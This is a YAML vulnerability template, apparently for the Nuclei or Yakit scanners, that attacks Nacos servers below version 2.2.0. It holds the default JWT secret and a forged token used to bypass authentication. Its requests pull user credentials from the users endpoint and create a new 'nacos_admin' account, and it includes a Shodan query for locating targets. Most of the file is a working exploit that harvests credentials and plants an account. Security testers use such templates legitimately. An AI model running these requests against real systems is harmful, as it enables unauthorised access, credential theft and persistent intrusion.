content:
id: nacos-authentication-bypass-add-user

info:
  name: Nacos < 2.2.0 - 认证身份绕过
  severity: critical
  description: |
    默认JWT Token认证绕过.
    SecertKey: SecretKey012345678901234567890123456789012345678901234567890123456789
    
  reference:
    - https://github.com/alibaba/nacos/issues/10060
    - https://avd.aliyun.com/detail?id=AVD-2023-1655789
    - https://nacos.io/zh-cn/docs/auth.html
  metadata:
    verified: "true"
    shodan-query: title:"Nacos"
  tags: auth-bypass,nacos,misconfig,jwt

variables:
  token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6IjM5NDgyNDkyNzYifQ.ZFxHBMpGIyzT8ERWAWST4L2V4o0ZqAe7fZLhch8LV6s

stop-at-first-match: true
requests:
  - method: GET
    path:
      - "{{BaseURL}}/nacos/v1/auth/users?pageNo=1&pageSize=10&accessToken={{token}}"
      - "{{BaseURL}}/v1/auth/users?pageNo=1&pageSize=10&accessToken={{token}}"
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        words:
          - '"username":'
          - '"password":'
        condition: and

      - type: word
        part: header
        words:
          - "application/json"

      - type: status
        status:
          - 200

    extractors:
      - type: json
        part: body
        name: extracted-credentials
        json:
          - ".pageItems[]"

  - method: POST
    path:
      - "{{BaseURL}}/nacos/v1/auth/users"
      - "{{BaseURL}}/v1/auth/users"
    headers:
      Content-Type: application/x-www-form-urlencoded
      accessToken: "{{token}}"
    body: "username=nacos_admin&password={{randstr_2}}"
    matchers-condition: and
    stop-at-first-match: true
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - '"code":'
          - "200"
          - '"data":'
          - '"create user ok!"'
        condition: and
      - type: word
        part: header
        words:
          - "application/json"
    extractors:
      - type: json
        part: body
        json:
          - ".message"
        name: Create user nacos_admin/{{randstr_2}}
params: "[{\"Field\":\"target\",\"TypeVerbose\":\"string\",\"FieldVerbose\":\"扫描目标\",\"Help\":\"扫描目标可接受：主机名 / 主机名:端口 / IP段 / URL 等多种格式\",\"Required\":true},{\"Field\":\"reverse-url\",\"TypeVerbose\":\"string\",\"FieldVerbose\":\"反连 URL\",\"Help\":\"可使用 InteractshURL 也可使用 Yakit Reverse URL\"},{\"Field\":\"debug\",\"TypeVerbose\":\"boolean\",\"FieldVerbose\":\"设置调试模式\",\"Help\":\"开启调试模式，调试模式将输出尽量多的调试信息\"},{\"Field\":\"proxy\",\"TypeVerbose\":\"proxy\",\"FieldVerbose\":\"HTTP 代理\",\"Help\":\"设置 HTTP 代理\"}]"
author: Tardigrade97
